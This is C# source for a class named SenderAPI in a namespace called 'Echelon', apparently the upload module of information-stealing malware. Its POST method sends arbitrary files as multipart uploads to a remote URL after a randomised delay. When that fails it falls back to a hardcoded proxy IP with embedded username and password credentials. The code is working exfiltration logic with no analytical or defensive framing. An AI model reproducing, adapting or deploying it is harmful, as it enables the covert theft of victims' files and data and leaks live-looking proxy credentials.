using System;
using System.Net;
using System.Threading;

namespace Echelon
{
	public class SenderAPI
	{
		public static void GET(string url)
		{
			try
			{
				using (WebClient webClient = new WebClient())
				{
					ServicePointManager.SecurityProtocol = (SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
					webClient.DownloadString(url);
				}
			}
			catch
			{
				using (WebClient webClient2 = new WebClient())
				{
					ServicePointManager.SecurityProtocol = (SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
					WebProxy webProxy2 = (WebProxy)(webClient2.Proxy = new WebProxy("168.235.103.57", 3128)
					{
						Credentials = new NetworkCredential("echelon", "002700z002700")
					});
					webClient2.DownloadString(url);
				}
			}
		}

		public static void POST(byte[] file, string filename, string contentType, string url)
		{
			Thread.Sleep(new Random(Environment.TickCount).Next(500, 2000));
			try
			{
				ServicePointManager.SecurityProtocol = (SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
				WebClient webClient = new WebClient
				{
					Proxy = null
				};
				string text = "------------------------" + DateTime.Now.Ticks.ToString("x");
				webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text);
				string @string = webClient.Encoding.GetString(file);
				string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", text, filename, contentType, @string);
				byte[] bytes = webClient.Encoding.GetBytes(s);
				webClient.UploadData(url, "POST", bytes);
			}
			catch
			{
				using (WebClient webClient2 = new WebClient())
				{
					ServicePointManager.SecurityProtocol = (SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
					string text2 = "------------------------" + DateTime.Now.Ticks.ToString("x");
					webClient2.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text2);
					string string2 = webClient2.Encoding.GetString(file);
					string s2 = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", text2, filename, contentType, string2);
					byte[] bytes2 = webClient2.Encoding.GetBytes(s2);
					WebProxy webProxy2 = (WebProxy)(webClient2.Proxy = new WebProxy("168.235.103.57", 3128)
					{
						Credentials = new NetworkCredential("echelon", "002700z002700")
					});
					webClient2.UploadData(url, "POST", bytes2);
				}
			}
		}
	}
}
